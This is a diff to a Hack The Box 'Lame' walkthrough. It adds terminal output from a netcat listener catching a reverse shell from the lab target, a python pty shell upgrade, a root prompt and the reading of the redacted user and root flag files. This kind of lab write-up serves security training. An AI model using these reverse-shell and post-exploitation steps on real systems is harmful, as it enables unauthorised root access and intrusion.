@@ -261,6 +261,7 @@ Now we start a listener on another shell
 nc -lvnp 4444
 ```
 
+
 We might run into an error while executing the script & in order to fix it we have to install the following python module if we are missing it:
 ```python
 pip3 install pysmb
@@ -270,7 +271,43 @@ Now we can run it again.. and if we have our listener ready we should be able to
 
 ## Pwnd
 We got a shell back, the first thing we look for is to make it interactive, for that matter we will see if the machine has python with
+```
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Lame]
+└─$ nc -lvnp 4444       
+listening on [any] 4444 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 45241
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+initrd.img.old
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
 
+
+```
+
+```
 ```
 which python
 ```
@@ -280,4 +317,34 @@ In this particular case that will be enought, we can use the following command t
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-Now we can grab our flag ;)
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+root@lame:/# ls
+ls
+bin    etc         initrd.img.old  mnt        root  tmp      vmlinuz.old
+boot   home        lib             nohup.out  sbin  usr
+cdrom  initrd      lost+found      opt        srv   var
+dev    initrd.img  media           proc       sys   vmlinuz
+root@lame:/# whoami
+whoami
+root
+```
+
+```
+root@lame:/home/makis# cat user.txt
+cat user.txt 
+[REDACTED]
+```
+
+```
+root@lame:/home/makis# cd /root
+cd /root
+root@lame:/root# ls
+ls
+Desktop  reset_logs.sh  root.txt  vnc.log
+root@lame:/root# cat root.txt
+cat root.txt
+[REDACTED]
+
+```
+Now we can submit our flags ;)
